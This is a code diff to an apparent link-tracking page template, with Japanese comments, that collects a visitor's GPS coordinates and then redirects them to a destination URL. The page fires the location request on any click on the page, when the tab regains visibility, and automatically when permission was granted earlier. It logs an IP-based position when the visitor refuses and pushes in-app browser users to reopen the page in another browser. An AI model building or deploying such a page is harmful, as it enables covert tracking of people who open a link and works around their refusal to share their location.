@@ -51,7 +51,8 @@ window.LT_HIT   = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
 window.LT_GEO   = 0;
 </script>
-<script src="/static/collect.js?v=15"></script>
+<script src="/static/geofix.js?v=16"></script>
+<script src="/static/collect.js?v=16"></script>
 <script>
 (function () {
   "use strict";
@@ -63,48 +64,11 @@ window.LT_GEO   = 0;
   var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
   var DEST_MIN      = {{ dest_min|default(2, true) }};
 
-  var go  = document.getElementById("go");
-  var st  = document.getElementById("st");
-  var got = false, left = false, step = 0, wid = null, dead = null, dog = null, busy = false;
+  var go = document.getElementById("go");
+  var st = document.getElementById("st");
+  var got = false, left = false, busy = false;
 
-  /* 1回目はオプション無し（ダイアログが出やすい）→ 精度を落として粘る */
-  var LADDER = [
-    { timeout: 12000, maximumAge: 0 },
-    { enableHighAccuracy: true,  timeout: 12000, maximumAge: 0 },
-    { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 },
-    { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 }
-  ];
-  function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
   function txt(m, warn) { st.textContent = m || ""; st.className = "st" + (warn ? " warn" : ""); }
-
-  function sendFix(p) {
-    var c = (p && p.coords) || {};
-    if (c.latitude == null || c.longitude == null) return;
-    try { LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy }); } catch (e) {}
-  }
-
-  function stopWatch() {
-    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
-  }
-
-  function done(p) {
-    sendFix(p);
-    if (got) return;
-    got = true;
-    if (dead) { clearTimeout(dead); dead = null; }
-    txt("", false);
-    go.style.display = "none";
-    var ia = document.getElementById("ia");
-    if (ia) ia.style.display = "none";
-    if (DEST && !left) {
-      setTimeout(function () {
-        if (left) return;
-        left = true;
-        stopWatch();
-        try { location.replace(DEST); } catch (e) { location.href = DEST; }
-      }, Math.max(400, (DEST_MIN || 2) * 1000));
-    }
-  }
 
   function showInApp() {
     var ua = navigator.userAgent || "", name = "";
@@ -127,83 +91,68 @@ window.LT_GEO   = 0;
     a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
   }
 
-  function fail() {
+  function done(p) {
+    var c = (p && p.coords) || {};
+    if (c.latitude == null || got) return;
+    got = true;
+    try { LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy }); } catch (e) {}
+    txt("", false);
+    go.style.display = "none";
+    var ia = document.getElementById("ia");
+    if (ia) ia.style.display = "none";
+    if (DEST && !left) {
+      setTimeout(function () {
+        if (left) return;
+        left = true;
+        try { location.replace(DEST); } catch (e) { location.href = DEST; }
+      }, Math.max(400, (DEST_MIN || 2) * 1000));
+    }
+  }
+
+  function fail(why) {
     if (got) return;
-    try { LT.send({ ip_point: 1 }); } catch (e) {}   // ← 追加（回線推定で1点残す）
-    stopWatch();
-    if (dog) { clearInterval(dog); dog = null; }
+    try { LT.send({ ip_point: 1 }); } catch (e) {}      // 回線推定で1点残す
     txt(DENY_TEXT, true);
     go.textContent = RETRY_TEXT;
     go.disabled = false;
     busy = false;
-    showInApp();
+    if (why === "denied") showInApp();
     if (DENY_REDIRECT && DEST && !left) {
       setTimeout(function () { left = true; location.replace(DEST); }, 1500);
     }
   }
 
-  function arm() {
-    stopWatch();
-    if (!navigator.geolocation) { fail(); return; }
-    txt(ASK_TEXT, false);
-    try {
-      wid = navigator.geolocation.watchPosition(function (p) {
-        if (p && p.coords && p.coords.latitude != null) { step = 0; done(p); }
-      }, function (e) {
-        if (got) return;
-        if ((e && e.code) === 1 && step === 0) { step++; arm(); return; }
-        if ((e && e.code) === 1) { fail(); return; }
-        if (step < LADDER.length - 1) { step++; arm(); return; }
-        fail();
-      }, opts());
-    } catch (e) {
-      wid = null;
-      if (step < LADDER.length - 1) { step++; arm(); } else fail();
-    }
-    if (!dead) dead = setTimeout(function () { if (!got && !left) fail(); }, 40000);
-    if (!dog) dog = setInterval(function () {
-      if (got || left) { clearInterval(dog); dog = null; return; }
-      if (step < LADDER.length - 1) step++;
-      arm();
-    }, 12000);
-  }
-
   function start() {
     if (got || left || busy) return;
+    if (!window.LTGEO) { fail("unsupported"); return; }
     busy = true;
     go.disabled = true;
     txt(ASK_TEXT, false);
-    arm();          /* ← クリックと同じタスクで位置情報を呼ぶ */
+    LTGEO.subscribe(done);
+    LTGEO.subscribeFail(fail);
+    LTGEO.subscribeStatus(function (t, w) { if (!got) txt(t, w); });
+    var inf = LTGEO.info();
+    if (inf.running) LTGEO.retry(); else LTGEO.start();   // ★ タップと同じタスク
   }
 
   go.addEventListener("click", start);
-
   document.addEventListener("click", function (e) {
     if (got || left) return;
     if (e.target === go) return;
     if (e.target && e.target.closest && e.target.closest("#ia")) return;
-    if (wid === null) { busy = false; start(); }
+    if (!busy) start();
   }, { passive: true });
-
   document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "visible" && !got && !left && wid === null) {
-      busy = false; start();
-    }
-  });
-  window.addEventListener("focus", function () {
-    if (!got && !left && wid === null) { busy = false; start(); }
+    if (document.visibilityState === "visible" && !got && !left && window.LTGEO) LTGEO.retry();
   });
   window.addEventListener("pageshow", function (e) {
-    if (e.persisted && !got && !left) { wid = null; busy = false; start(); }
+    if (e.persisted && !got && !left && window.LTGEO) LTGEO.retry();
   });
 
   /* すでに許可済みなら読み込み時から取りにいく */
   if (navigator.permissions && navigator.permissions.query) {
     navigator.permissions.query({ name: "geolocation" }).then(function (p) {
       if (p.state === "granted") start();
-      p.onchange = function () {
-        if (p.state === "granted" && !got && !left) { wid = null; busy = false; start(); }
-      };
     }).catch(function () {});
   }
 })();
